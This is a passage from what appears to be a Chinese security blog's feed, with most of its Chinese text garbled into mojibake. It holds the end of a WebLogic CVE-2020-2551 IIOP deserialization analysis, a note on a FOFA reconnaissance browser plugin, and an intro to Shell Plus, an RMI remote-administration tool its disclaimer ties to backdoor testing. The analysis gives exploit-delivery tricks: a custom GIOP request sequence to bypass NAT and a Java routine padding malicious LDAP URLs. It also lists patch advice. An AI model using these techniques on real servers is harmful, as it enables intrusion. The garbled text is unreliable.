12.2.1.4.0ï¼Œæˆ‘æŠŠè¿™ç§æƒ…å†µåˆ†ä¸ºäº†ä¸¤å¤§ç‰ˆæœ¬ï¼Œ10.3.6.0.0 å’Œ 12.1.3.0.0 ä¸ºä¸€ä¸ªç‰ˆæœ¬ï¼ˆä½ç‰ˆæœ¬ï¼‰ï¼Œ12.2.1.3.0 å’Œ 12.2.1.4.0 ä¸ºå¦å¤–ä¸€ä¸ªç‰ˆæœ¬ï¼Œæ‰€ä»¥å®Œæ•´çš„ POC éœ€è¦å…¼å®¹ä¿©ä¸ªç‰ˆæœ¬çš„éªŒè¯ï¼Œæ¯”è¾ƒå¥½ä¸€ç‚¹çš„åšæ³•å°±æ˜¯é€šè¿‡æŠ“åŒ…ç„¶åå°†2ä¸ªåŒ…çš„å†…å®¹è¿›è¡Œå¤šæ¬¡å‘é€ï¼Œæˆ–è€…åœ¨åˆ©ç”¨çš„å‰æå¾—çŸ¥ Weblogic ä½¿ç”¨çš„æ“ä½œç‰ˆæœ¬ï¼Œä¸€èˆ¬ weblogic çš„ç‰ˆæœ¬ä¼šåœ¨ <code>https?://host//console/login/LoginForm.jsp</code> é¡µé¢ä¼šç°å®ç‰ˆæœ¬ã€‚</p><p><img src="https://img.zhiiyun.com/blog_5f3677ea70101dd2457fc1fdfa57f695" alt=""></p><h3 id="éªŒè¯é—®é¢˜"><a href="#éªŒè¯é—®é¢˜" class="headerlink" title="éªŒè¯é—®é¢˜"></a>éªŒè¯é—®é¢˜</h3><p>åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½éƒ½ä½¿ç”¨è¯·æ±‚ LDAP åè®®è¯»å–è¿œç¨‹çš„ class æ–‡ä»¶ï¼Œç„¶åæ‰å¯ä»¥æ‰§è¡ŒéªŒè¯ä»£ç ï¼Œè¿™æ ·åšä¼šå¯¼è‡´å¤šæ¬¡å‘åŒ…ç»™ DNSLOG å¹³å°è¿›è¡ŒéªŒè¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´éªŒè¯çš„é—®é¢˜ã€‚</p><p>åœ¨å‰é¢è®²åˆ°è§£æçš„æµç¨‹ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ <code>lookup</code> å»LDAPè¯»å–è¿œç¨‹çš„ class æ–‡ä»¶ã€‚å¦‚æœè¯·æ±‚çš„åè®®ä¸ºä¸å­˜åœ¨çš„æŸä¸€ä¸ªåè®®çš„è¯å°±ä¼šå‡ºç°ä»¥ä¸‹æƒ…å†µï¼š</p><p><img src="https://img.zhiiyun.com/blog_b636c55154aff1b5170fd0fac1d95078" alt=""></p><p><img src="https://img.zhiiyun.com/blog_9d020c32d51dd68db656a8a680b94452" alt=""></p><p><img src="https://img.zhiiyun.com/blog_8c139c1d110144038ce9617d4395f773" alt=""></p><p>é€šè¿‡ Wireshark æŸ¥çœ‹ï¼Œå¦‚æœå‘é€ä¸å­˜åœ¨çš„åè®®ä¼šå“åº”å›å¤ <code>System Exception</code> é”™è¯¯ä¿¡æ¯ï¼š</p><p><img src="https://img.zhiiyun.com/blog_2129b4ddb22ec3b5c287e79384f860e6" alt=""></p><p>å¦‚æœæˆåŠŸä¼šè¿›è¡Œå“åº” <code>User Exception</code> ä¿¡æ¯ï¼š</p><p><img src="https://img.zhiiyun.com/blog_2ccb4d63e14012c5df60f19767955baf" alt=""></p><p>é‚£ä¹ˆå¯ä»¥åŸºäºè¯¥æƒ…å†µè¿›è¡Œé€šè¿‡è½¬æ¢æ„é€ å¼‚å¸¸æ¥è¿›è¡Œåˆ¤æ–­æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚</p><h3 id="NAT-ç½‘ç»œé—®é¢˜"><a href="#NAT-ç½‘ç»œé—®é¢˜" class="headerlink" title="NAT ç½‘ç»œé—®é¢˜"></a>NAT ç½‘ç»œé—®é¢˜</h3><p>NAT ç½‘ç»œé—®é¢˜æ˜¯ä¸€ä¸ªéå¸¸è¦å‘½çš„é—®é¢˜ï¼Œå› ä¸º weblogic åœ¨è¿è¡Œæ—¶éƒ½æ˜¯åœ¨å†…ç½‘è¿è¡Œçš„çš„ï¼Œå¤–ç½‘è®¿é—®çš„ weblogic å…¨éƒ¨éƒ½æ˜¯è½¬å‘å‡ºå»çš„ï¼Œè¿™æ ·å°±ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜é…ç½®çš„ IP éƒ½ä¸ºå†…ç½‘åœ°å€ï¼Œå°±ä¼šå¯¼è‡´æ— æ³•æ­£å¸¸æµ‹è¯•æˆåŠŸã€‚</p><p><strong>æ³¨ï¼šNAT ç½‘ç»œæµ‹è¯•ä»…é€šè¿‡ Docker è¿›è¡Œæµ‹è¯•ï¼Œå¹¶æœªé’ˆå¯¹äº’è”ç½‘è¿›è¡Œæµ‹è¯•ã€‚</strong></p><p>æ­£å¸¸ä½¿ç”¨å·¥å…·è¿›è¡Œæµ‹è¯•æ—¶ä¼šå‡ºç°ä¼šå“åº”å†…ç½‘ç»‘å®š IP åœ°å€ç„¶åä¸€ç›´è¿›è¡Œ redictï¼Œå¹¶ä¸”åœ¨æœ€åæŠ›å‡º <code>time out</code> é—®é¢˜ã€‚</p><p><img src="https://img.zhiiyun.com/blog_7c710402e6b4cddf97600b9786255578" alt=""><br><img src="https://img.zhiiyun.com/blog_bae433e11cc0c247f74036c5560e434b" alt=""></p><p>é’ˆå¯¹è¿™ç§æƒ…å†µåªèƒ½é€šè¿‡è‡ªå®šä¹‰å®ç° GIOP åè®®æ¥ç»•è¿‡è¯¥æ–¹å¼ï¼š</p><ol><li>è¯·æ±‚ LocationRequestï¼Œè·å– key ã€‚</li><li>è¯·æ±‚Requestï¼Œ op=_non_existentï¼Œæ‰“å¼€ IIOP é€šé“ã€‚</li><li>è¯·æ±‚Requestï¼Œop=bind_anyï¼Œè¿›è¡Œå‘é€æ¶æ„åºåˆ—åŒ–å†…å®¹ã€‚</li></ol><p>é€šè¿‡ Wireshark æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¹‹å‰æµ‹è¯•é¶åœºæ—¶ä¼šå‘åŒ…ä»¥ä¸‹å†…å®¹ï¼š<br><img src="https://img.zhiiyun.com/blog_4ee6e9aea3907c0f3bbdfd15e5457d03" alt=""></p><p>æˆ‘ä»¬å¯ä»¥åŸºäºä¹‹å‰å‘é€çš„ <code>op=_non_existent</code> è¿›è¡Œé‡æ–°æ„é€ ï¼Œä¿®æ”¹ iiop åœ°å€ï¼š</p><p><img src="https://img.zhiiyun.com/blog_60217953a771b8509db929d8912547f1" alt=""></p><p>åœ¨é‡æ–°  <code>op=_non_existent</code>  å‘åŒ…æ—¶éœ€è¦é¦–å…ˆè·å– <code>Key Address</code> ï¼ˆkey å­˜åœ¨æœ‰æ•ˆæœŸæ—¶é—´ï¼‰å¦åˆ™ä¼šè¿›è¡Œä¸€ç›´è¿›è¡Œ <code>Location Forward</code>ï¼Œè·å– <code>Key</code> ä¿¡æ¯å¹¶ä¸”ä¿®æ”¹ iiop åœ°å€æ‰“å¼€ IIOP é€šé“ï¼Œæœ€åè¿›è¡Œå‘é€æ¶æ„åºåˆ—åŒ–å†…å®¹ã€‚</p><p><img src="https://img.zhiiyun.com/blog_50ea0a97161aaf01fee9a690d30caeca" alt=""><br><img src="https://img.zhiiyun.com/blog_bcc86db8176def94b5ce1f576d3cf443" alt=""></p><h3 id="LDAP-å¡«å……é—®é¢˜"><a href="#LDAP-å¡«å……é—®é¢˜" class="headerlink" title="LDAP å¡«å……é—®é¢˜"></a>LDAP å¡«å……é—®é¢˜</h3><p>é€šè¿‡ socket å‘åŒ…çš„å½¢å¼è¿›è¡Œå‘åŒ…æ—¶ï¼Œå¦‚éœ€è¦è¿›è¡Œæ›¿æ¢ LDAP URL æ—¶ï¼Œæ­£å¸¸ä¿®æ”¹ URL ä¼šä¸€ç›´å¯¼è‡´å‘åŒ…å“åº”é”™è¯¯ï¼Œéœ€è¦é€šè¿‡  <code>#</code> è¿›è¡Œ panding æ„é€ æŒ‡å®šå­—èŠ‚é•¿åº¦çš„ URL ç„¶åé€šè¿‡ <code>#</code> å¡«å……ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String append = &quot;&quot;;</span><br><span class="line">for (int i = ldapUrl.length(); i &lt; 0x60; i++) &#123;</span><br><span class="line">    append += &quot;#&quot;;</span><br><span class="line">&#125;</span><br><span class="line">String url = ldapUrl+append;</span><br><span class="line">System.out.println(url);</span><br></pre></td></tr></table></figure></p><h2 id="Weblogic-çš„é—®é¢˜"><a href="#Weblogic-çš„é—®é¢˜" class="headerlink" title="Weblogic çš„é—®é¢˜"></a>Weblogic çš„é—®é¢˜</h2><p><strong> æˆªæ­¢ 2020 å¹´ 3 æœˆ 4 æ—¥ï¼Œé€šè¿‡ Oracle å®˜æ–¹è¿›è¡Œä¸‹è½½ weblogic æ—¶ï¼Œé€šè¿‡ç ”ç©¶å‘ç°è¯¥æ¼æ´ä¾ç„¶å­˜åœ¨å¯ä»¥åˆ©ç”¨ï¼ˆæ‰€æœ‰å—å½±å“ç‰ˆæœ¬ï¼‰ï¼Œéœ€è¦é¢å¤–å®‰è£…è¡¥ä¸ã€‚</strong><br>å¦‚ä¸‹æ–‡ä»¶ä¸ºä¸‹æ–‡ä»¶MD5å€¼ä»¥åŠä¸‹è½½æ—¶é—´ï¼š</p><table><thead><tr><th style="text-align:center">æ–‡ä»¶åç§°</th><th style="text-align:center">MD5</th><th style="text-align:center">SHA1</th><th style="text-align:center">åˆ›å»ºæ—¶é—´</th></tr></thead><tbody><tr><td style="text-align:center">wls1036_generic.jar</td><td style="text-align:center">33D45745FF0510381DE84427A7536F65</td><td style="text-align:center">FFBC529D598EE4BCD1E8104191C22F1C237B4A3E</td><td style="text-align:center">â€2020â€-03â€-04â€</td></tr><tr><td style="text-align:center">fmw_12.1.3.0.0_wls.jar</td><td style="text-align:center">8378FE936B476A6F4CA5EFA465A435E3</td><td style="text-align:center">5B1761BA2FC31DC8C32436159911E55097B00B1E</td><td style="text-align:center">â€2020â€-03â€-04â€</td></tr><tr><td style="text-align:center">fmw_12.2.1.3.0_wls.jar</td><td style="text-align:center">6E7105521029058AD64A5C6198DB09F7</td><td style="text-align:center">74345654AF2C60EA13CF172A7851039A64BFE7E1</td><td style="text-align:center">â€2017-08â€-21â€</td></tr><tr><td style="text-align:center">fmw_12.2.1.4.0_wls.jar</td><td style="text-align:center">AA090712069684991BA27E4DE9ED3FF6</td><td style="text-align:center">CFAA5752D33DD5FFB7A57F91686E15B465367311</td><td style="text-align:center">â€2019-09â€-13â€</td></tr></tbody></table><p>å»ºè®®ç›®å‰å·²ç»å®‰è£…æœ€æ–°ç‰ˆ weblogic æ—¶åŒæ’æŸ¥è¯¥æ¼æ´ï¼Œå¦‚æœ‰æ¼æ´å»ºè®®ç«‹å³å®‰è£…è¡¥ä¸æˆ–é€šè¿‡ä¿®å¤æ–¹æ¡ˆè¿›è¡Œä¿®å¤ï¼Œé˜²æ­¢è¢«ä¸æ³•åˆ†å­åˆ©ç”¨ã€‚</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><ol><li>é€šè¿‡ weblogic æ§åˆ¶å°è¿›è¡Œå…³é—­ IIOP åè®®ï¼Œç„¶åé‡æ–°å¯åŠ¨ weblogicæœåŠ¡ã€‚</li><li>å®‰è£… weblogic <a href="https://www.oracle.com/security-alerts/cpujan2020.html" target="_blank" rel="noopener">ä¿®å¤è¡¥ä¸</a>ï¼Œè¿›è¡Œä¿®å¤ã€‚</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://www.anquanke.com/post/id/197605" target="_blank" rel="noopener">Weblogic IIOPååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2020-2551ï¼‰ æ¼æ´åˆ†æ</a></li><li><a href="https://www.anquanke.com/post/id/199695" target="_blank" rel="noopener">WebLogic WLSæ ¸å¿ƒç»„ä»¶RCEåˆ†æï¼ˆCVE-2020-2551ï¼‰</a></li><li><a href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html" target="_blank" rel="noopener">IDEA+dockerï¼Œè¿›è¡Œè¿œç¨‹æ¼æ´è°ƒè¯•ï¼ˆweblogicï¼‰</a></li><li><a href="https://lucifaer.com/2020/02/20/Java%20CORBA%E7%A0%94%E7%A9%B6/" target="_blank" rel="noopener">Java CORBAç ”ç©¶</a></li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">åŸºäºJavaååºåˆ—åŒ–RCE - ææ‡‚RMIã€JRMPã€JNDI</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;2020 å¹´ 1æœˆ14æ—¥ï¼ŒOracle å‘å¸ƒäº†å¤§é‡å®‰å…¨è¡¥ä¸ï¼Œä¿®å¤äº† 43 ä¸ªä¸¥é‡æ¼æ´ï¼ŒCVSS è¯„åˆ†å‡åœ¨åœ¨9.1ä»¥ä¸Šã€‚&lt;br&gt;å…¶ä¸­ CVE-
      
    
    </summary>
    
      <category term="æ¼æ´ç ”ç©¶" scheme="http://www.r4v3zn.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="weblogic" scheme="http://www.r4v3zn.com/tags/weblogic/"/>
    
      <category term="iiop" scheme="http://www.r4v3zn.com/tags/iiop/"/>
    
      <category term="cve" scheme="http://www.r4v3zn.com/tags/cve/"/>
    
      <category term="giop" scheme="http://www.r4v3zn.com/tags/giop/"/>
    
  </entry>
  
  <entry>
    <title>FOFA Pro Viewï¼šFOFA Pro èµ„äº§å±•ç¤ºæµè§ˆå™¨æ’ä»¶</title>
    <link href="http://www.r4v3zn.com/posts/1e051527/"/>
    <id>http://www.r4v3zn.com/posts/1e051527/</id>
    <published>2019-12-29T11:37:21.000Z</published>
    <updated>2020-11-11T08:06:56.020Z</updated>
    
    <content type="html"><![CDATA[<p>FOFA Pro view æ˜¯ä¸€æ¬¾FOFA Pro èµ„äº§å±•ç¤ºæµè§ˆå™¨æ’ä»¶ï¼Œç›®å‰å…¼å®¹<a href="https://www.google.com/chrome/" target="_blank" rel="noopener">Chrome</a>ã€<a href="https://www.mozilla.org/" target="_blank" rel="noopener">Firefox</a>ã€<a href="https://www.opera.com/" target="_blank" rel="noopener">Opera</a>ã€‚</p><p>The Fofa Pro View plugin tells you where the website is hosted (country, city), who owns the IP and what other services/ ports are open.</p><p>The Fofa Pro View plugin for Chrome automatically checks whether Fofa Pro has any information for the current website. Is the website also running FTP, DNS, SSH or some unusual service? With this plugin you can see all the info that Fofa Pro has collected on a given website/ domain.</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/0nise/fofa_view" target="_blank" rel="noopener">https://github.com/0nise/fofa_view</a></p><p>FOFA Pro view 0.0.2ç‰ˆæœ¬å·²æ›´æ–°ï¼ŒFirefoxå¯ç›´æ¥åœ¨å•†åŸæ›´æ–°ï¼ŒChrome é¢„è®¡2019å¹´2æœˆ6æˆ–2æœˆ7æ—¥å¯è¿›è¡Œå®‰è£…æ›´æ–°ã€‚<br>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/0nise/fofa_view/releases" target="_blank" rel="noopener">https://github.com/0nise/fofa_view/releases</a><br>æ›´æ–°æ—¥å¿—ï¼š</p><ul><li>ä¼˜åŒ–ï¼šé¢æ¿ä¸Šé¢æ–‡å­—æ— æ³•ç›´æ¥å¤åˆ¶ï¼ˆå¦‚ipåœ°å€ï¼‰ï¼Œå»ºè®®è®©æ–‡å­—å¯é€‰å–ï¼Œå¢åŠ ä½¿ç”¨ä¾¿åˆ©æ€§ã€‚</li><li>ä¼˜åŒ–ï¼šåˆ·æ–°ç¡®è®¤æŒ‰é’®ç¬¬ä¸€æ¬¡æ‰“å¼€æœ‰åŠæˆªè—åœ¨å±å¹•é‡Œç‚¹ä¸åˆ°ã€‚</li><li>ä¼˜åŒ–ï¼šç½‘ç»œåŠ è½½è¾ƒæ…¢å¯¼è‡´æ ·å¼ã€å›¾æ ‡åŠ è½½å¤±è´¥é—®é¢˜ã€‚</li><li>æ–°å¢ï¼šè¡¨æ ¼Hostå­—æ®µã€‚</li></ul><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p><img src="https://img.zhiiyun.com/blog_038998ea977f5b9617b992eeb17e08c6" alt=""></p><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><h4 id="æ‰‹åŠ¨å®‰è£…"><a href="#æ‰‹åŠ¨å®‰è£…" class="headerlink" title="æ‰‹åŠ¨å®‰è£…"></a>æ‰‹åŠ¨å®‰è£…</h4><p>ä¸‹è½½ç‰ˆæœ¬ï¼š<a href="https://github.com/0nise/fofa_view/releases" target="_blank" rel="noopener">https://github.com/0nise/fofa_view/releases</a></p><p><img src="https://img.zhiiyun.com/blog_d8c4407eaad1255f3184fc365fb62fdc" alt=""></p><p><img src="https://img.zhiiyun.com/blog_8b5830ac17694a521f23d2c4452bf39c" alt=""></p><p>è§£å‹æ’ä»¶å‹ç¼©åŒ…ï¼Œæ‰“å¼€ <a href="chrome://extensions/" target="_blank" rel="noopener">chrome://extensions/</a> å¹¶ä¸”å¼€å¯å¼€å‘è€…æ¨¡å¼ï¼Œç‚¹å‡» <code>åŠ è½½å·²è§£å‹çš„æ‰©å±•ç¨‹åº</code> é€‰æ‹©å·²ç»è§£å‹çš„æ’ä»¶ç›®å½•è¿›è¡ŒåŠ è½½ã€‚</p><h4 id="å•†åŸå®‰è£…"><a href="#å•†åŸå®‰è£…" class="headerlink" title="å•†åŸå®‰è£…"></a>å•†åŸå®‰è£…</h4><p><img src="https://img.zhiiyun.com/blog_852190fe478cd8a0a7455a6a5769b8d0" alt=""></p><h3 id="FireFox"><a href="#FireFox" class="headerlink" title="FireFox"></a>FireFox</h3><h4 id="æ‰‹åŠ¨å®‰è£…-1"><a href="#æ‰‹åŠ¨å®‰è£…-1" class="headerlink" title="æ‰‹åŠ¨å®‰è£…"></a>æ‰‹åŠ¨å®‰è£…</h4><p>ä¸‹è½½ç‰ˆæœ¬ï¼š<a href="https://github.com/0nise/fofa_view/releases" target="_blank" rel="noopener">https://github.com/0nise/fofa_view/releases</a></p><p><img src="https://img.zhiiyun.com/blog_549e7970f48e38b93c77a1c27a7780f2" alt=""></p><p>è§£å‹æ’ä»¶å‹ç¼©åŒ…ï¼Œæ‰“å¼€ <a href="about:debugging#/runtime/this-firefox" target="_blank" rel="noopener">about:debugging#/runtime/this-firefox</a> ç‚¹å‡»<code>ä¸´æ—¶è½½å…¥é™„åŠ ç»„ä»¶â€¦</code>é€‰æ‹©ä¸‹è½½çš„æ’ä»¶å‹ç¼©åŒ…ã€‚</p><h4 id="å•†åŸå®‰è£…-1"><a href="#å•†åŸå®‰è£…-1" class="headerlink" title="å•†åŸå®‰è£…"></a>å•†åŸå®‰è£…</h4><p><img src="https://img.zhiiyun.com/blog_1c20cdb866988c902dd8730190fceac6" alt=""></p><h2 id="æ›´æ–°æ—¥å¿—"><a href="#æ›´æ–°æ—¥å¿—" class="headerlink" title="æ›´æ–°æ—¥å¿—"></a>æ›´æ–°æ—¥å¿—</h2><p>2019-01-04</p><ul><li>ä¼˜åŒ–ï¼šé¢æ¿ä¸Šé¢æ–‡å­—æ— æ³•ç›´æ¥å¤åˆ¶ï¼ˆå¦‚ipåœ°å€ï¼‰ï¼Œå»ºè®®è®©æ–‡å­—å¯é€‰å–ï¼Œå¢åŠ ä½¿ç”¨ä¾¿åˆ©æ€§</li><li>ä¼˜åŒ–ï¼šåˆ·æ–°ç¡®è®¤æŒ‰é’®ç¬¬ä¸€æ¬¡æ‰“å¼€æœ‰åŠæˆªè—åœ¨å±å¹•é‡Œç‚¹ä¸åˆ°</li><li>ä¼˜åŒ–ï¼šç½‘ç»œåŠ è½½è¾ƒæ…¢å¯¼è‡´æ ·å¼ã€å›¾æ ‡åŠ è½½å¤±è´¥é—®é¢˜ã€‚</li><li>æ–°å¢ï¼šè¡¨æ ¼Hostå­—æ®µ<br>2019-12-31</li><li>Chromeã€Firefoxå¯åœ¨å•†åŸç›´æ¥æœç´¢å®‰è£…<br>2019-12-29</li><li>æ·»åŠ IPä½ç½®ä¿¡æ¯</li><li>æ·»åŠ èµ„äº§ä¿¡æ¯</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;FOFA Pro view æ˜¯ä¸€æ¬¾FOFA Pro èµ„äº§å±•ç¤ºæµè§ˆå™¨æ’ä»¶ï¼Œç›®å‰å…¼å®¹&lt;a href=&quot;https://www.google.com/chrome/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Chrome&lt;/a&gt;ã€&lt;a href=&quot;https
      
    
    </summary>
    
    
      <category term="FOFA Pro" scheme="http://www.r4v3zn.com/tags/FOFA-Pro/"/>
    
  </entry>
  
  <entry>
    <title>Shell plus ä¸€æ¬¾åŸºäºRMIçš„æœåŠ¡å™¨ç®¡ç†å·¥å…·</title>
    <link href="http://www.r4v3zn.com/posts/3a83e666/"/>
    <id>http://www.r4v3zn.com/posts/3a83e666/</id>
    <published>2019-12-18T04:19:41.000Z</published>
    <updated>2020-11-11T08:06:56.245Z</updated>
    
    <content type="html"><![CDATA[<p>Shell Plus æ˜¯åŸºäº RMI çš„ä¸€æ¬¾æœåŠ¡å™¨ç®¡å·¥å…·ï¼Œç”±æœåŠ¡ç«¯ã€æ³¨å†Œä¸­å¿ƒã€å®¢æˆ·ç«¯è¿›è¡Œç»„æˆã€‚</p><h3 id="å…è´£å£°æ˜"><a href="#å…è´£å£°æ˜" class="headerlink" title="å…è´£å£°æ˜"></a>å…è´£å£°æ˜</h3><p>è¯¥å·¥å…·ç”¨äºæœåŠ¡å™¨ç®¡ç†ã€æ”»é˜²åé—¨å®‰å…¨æµ‹è¯•æŠ€æœ¯ç ”ç©¶ï¼Œç¦æ­¢ç”¨äºéæ³•çŠ¯ç½ªã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>RMIï¼ˆRemote Method Invocationï¼‰è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚èƒ½å¤Ÿè®©åœ¨å®¢æˆ·ç«¯Javaè™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡åƒè°ƒç”¨æœ¬åœ°å¯¹è±¡ä¸€æ ·è°ƒç”¨æœåŠ¡ç«¯java è™šæ‹Ÿæœºä¸­çš„å¯¹è±¡ä¸Šçš„æ–¹æ³•ã€‚</p><p><img src="https://img.zhiiyun.com/blog_47d1970f0ec964b41b8206c79402496b" alt=""></p><p>RMIè¿œæ–¹æ³•ç¨‹è°ƒç”¨æ­¥éª¤ï¼š </p><ol><li>å®¢æˆ·è°ƒç”¨å®¢æˆ·ç«¯è¾…åŠ©å¯¹è±¡stubä¸Šçš„æ–¹æ³•</li><li>å®¢æˆ·ç«¯è¾…åŠ©å¯¹è±¡stubæ‰“åŒ…è°ƒç”¨ä¿¡æ¯ï¼ˆå˜é‡ã€æ–¹æ³•åï¼‰ï¼Œé€šè¿‡ç½‘ç»œå‘é€ç»™æœåŠ¡ç«¯è¾…åŠ©å¯¹è±¡skeleton</li><li>æœåŠ¡ç«¯è¾…åŠ©å¯¹è±¡skeletonå°†å®¢æˆ·ç«¯è¾…åŠ©å¯¹è±¡å‘é€æ¥çš„ä¿¡æ¯è§£åŒ…ï¼Œæ‰¾å‡ºçœŸæ­£è¢«è°ƒç”¨çš„æ–¹æ³•ä»¥åŠè¯¥æ–¹æ³•æ‰€åœ¨å¯¹è±¡</li><li>è°ƒç”¨çœŸæ­£æœåŠ¡å¯¹è±¡ä¸Šçš„çœŸæ­£æ–¹æ³•ï¼Œå¹¶å°†ç»“æœè¿”å›ç»™æœåŠ¡ç«¯è¾…åŠ©å¯¹è±¡skeleton</li><li>æœåŠ¡ç«¯è¾…åŠ©å¯¹è±¡å°†ç»“æœæ‰“åŒ…ï¼Œå‘é€ç»™å®¢æˆ·ç«¯è¾…åŠ©å¯¹è±¡stub</li><li>å®¢æˆ·ç«¯è¾…åŠ©å¯¹è±¡å°†è¿”å›å€¼è§£åŒ…ï¼Œè¿”å›ç»™è°ƒç”¨è€…</li><li>å®¢æˆ·è·å¾—è¿”å›å€¼</li></ol><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><p>å‡è®¾Aå…¬å¸æ˜¯æŸä¸ªè¡Œä¸šçš„ç¿˜æ¥šï¼Œå¼€å‘äº†ä¸€ç³»åˆ—è¡Œä¸šä¸Šé¢†å…ˆçš„è½¯ä»¶ã€‚Bå…¬å¸æƒ³åˆ©ç”¨Aå…¬å¸çš„è¡Œä¸šä¼˜åŠ¿è¿›è¡Œä¸€äº›æ•°æ®ä¸Šçš„äº¤æ¢å’Œå¤„ç†ã€‚ä½†Aå…¬å¸ä¸å¯èƒ½æŠŠå…¶å…¨éƒ¨è½¯ä»¶éƒ½éƒ¨ç½²åˆ°Bå…¬å¸ï¼Œä¹Ÿä¸èƒ½ç»™Bå…¬å¸å…¨éƒ¨æ•°æ®çš„è®¿é—®æƒé™ã€‚äºæ˜¯Aå…¬å¸åœ¨ç°æœ‰çš„è½¯ä»¶ç»“æ„ä½“ç³»ä¸å˜çš„å‰æä¸‹å¼€å‘äº†ä¸€äº›RMIæ–¹æ³•ã€‚Bå…¬å¸è°ƒç”¨Aå…¬å¸çš„RMIæ–¹æ³•æ¥å®ç°å¯¹Aå…¬å¸æ•°æ®çš„è®¿é—®å’Œæ“ä½œï¼Œè€Œæ‰€æœ‰æ•°æ®å’Œæƒé™éƒ½åœ¨Aå…¬å¸çš„æ§åˆ¶èŒƒå›´å†…ï¼Œä¸ç”¨æ‹…å¿ƒBå…¬å¸çªƒå–å…¶æ•°æ®æˆ–è€…å•†ä¸šæœºå¯†ã€‚</p><p>å·¥å…·å€Ÿç”¨ RMI çš„è°ƒç”¨åŸç†ï¼Œæ‰€æœ‰çš„æ•°æ®æ“ä½œéƒ½æ˜¯å‘ç”Ÿåœ¨æœåŠ¡ç«¯è¿›è¡Œå®Œæˆçš„ï¼Œå®¢æˆ·ç«¯é€šè¿‡æ³¨å†Œä¸­å¿ƒè¿›è¡Œè°ƒç”¨æœåŠ¡ç«¯çš„ä»£ç åœ¨<strong>æœåŠ¡ç«¯</strong> è¿›è¡Œæ‰§è¡Œï¼Œæœ€åå°†ç›¸åº”ç»“æœè¿›è¡Œè¿”å›ã€‚</p><p>é€šè¿‡ç¼–å†™æœåŠ¡å™¨ç®¡ç†ä»£ç ï¼Œä»£ç è¿›è¡Œæ³¨å†Œåˆ°æœåŠ¡ä¸­ï¼Œç„¶åç”±å®¢æˆ·ç«¯è¿›è¡Œè°ƒç”¨è¯¥æœåŠ¡ç«¯ä»£ç æ‰§è¡Œæ“ä½œã€‚</p><h3 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h3><p>å¼€æºåœ°å€ï¼š<a href="https://github.com/0nise/shell-plus" target="_blank" rel="noopener">https://github.com/0nise/shell-plus</a></p><p>è‡ªè¡Œç¼–è¯‘ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/0nise/shell-plus</span><br><span class="line">cd shell-plus</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p>å‘è¡Œç‰ˆæœ¬ï¼š<a href="https://github.com/0nise/shell-plus/releases" target="_blank" rel="noopener">https://github.com/0nise/shell-plus/releases</a></p><p>å¼€å¯æœåŠ¡ç«¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp shell-plus-1.0.jar Main &lt;port&gt; &lt;ip&gt; [pwd]</span><br></pre></td></tr></table></figure></p><p><img src="https://img.zhiiyun.com/blog_23c9b013e9d506072783eaa05fd5cae0" alt=""></p><p>ä¾‹å­ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp shell-plus-1.0.jar Main 3333 127.0.0.1 123456</span><br></pre></td></tr></table></figure></p><p>è¿æ¥æœåŠ¡ç«¯ç®¡ç†æœåŠ¡å™¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp shell-plus-1.0.jar Client &lt;port&gt; &lt;ip&gt; &lt;name&gt; [pwd]</span><br></pre></td></tr></table></figure></p><p><img src="https://img.zhiiyun.com/blog_60e4273e15a3a7e08d47d9b494f83dbb" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp shell-plus-1.0.jar Main 3333 127.0.0.1 3I3IF5liOOrw731Y 123456</span><br></pre></td></tr></table></figure></p><p>å…¶ä¸­ <code>pwd</code> 